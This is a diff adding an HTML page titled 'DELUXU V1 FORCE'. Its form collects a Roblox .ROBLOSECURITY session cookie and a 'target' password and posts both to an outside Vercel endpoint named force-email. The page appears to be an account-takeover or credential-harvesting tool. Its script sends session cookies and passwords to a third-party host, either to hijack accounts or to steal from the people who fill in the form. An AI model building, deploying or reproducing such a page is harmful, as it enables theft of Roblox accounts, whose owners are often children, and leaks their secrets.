@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>DELUXU V1 FORCE</title>
+    <style>
+        body {
+            background: #121629;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: #1d2238;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        .card .header {
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .note {
+            font-size: 13px;
+            color: #bbb;
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background: #2c314d;
+            color: #fff;
+        }
+        button {
+            width: 100%;
+            margin-top: 15px;
+            padding: 12px;
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: #fff;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover {
+            opacity: 0.9;
+        }
+        #message {
+            margin-top: 15px;
+            text-align: center;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">DELUXU V1 FORCE</div>
+    <p class="note"><b>Note:</b> If this is new, it may not work right away. Use with caution.</p>
+
+    <form id="forceForm">
+        <label for="cookie">Roblox Cookie (.ROBLOSECURITY)</label>
+        <input type="text" id="cookie" placeholder="Paste your Roblox cookie here" required>
+
+        <label for="password">Roblox Password</label>
+        <input type="password" id="password" placeholder="Target Roblox password" required>
+
+        <button type="submit">EXECUTE FORCE</button>
+    </form>
+
+    <div id="message"></div>
+</div>
+
+<script>
+    document.getElementById("forceForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const cookie = document.getElementById("cookie").value.trim();
+        const password = document.getElementById("password").value.trim();
+
+        if (!cookie || !password) {
+            document.getElementById("message").innerHTML = "<p style='color:red;'>❌ Please enter cookie and password</p>";
+            return;
+        }
+
+        // Send request to force-email API (Vercel URL!)
+        fetch("https://force-xi.vercel.app/api/force-email", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                cookie: cookie,
+                password: password
+            })
+        })
+        .then(async (response) => {
+            const data = await response.json();
+            if (response.ok) {
+                document.getElementById("message").innerHTML = `<p style='color:lime;'>✅ FORCE SUCCESSFUL!<br>${data.message}</p>`;
+                document.getElementById("forceForm").reset();
+            } else {
+                document.getElementById("message").innerHTML = `<p style='color:red;'>❌ ERROR: ${data.error || 'Unknown error'}</p>`;
+            }
+        })
+        .catch(error => {
+            console.error("Fetch error:", error);
+            document.getElementById("message").innerHTML = "<p style='color:red;'>❌ ERROR: Failed to fetch</p>";
+        });
+    });
+</script>
+
+</body>
+</html>
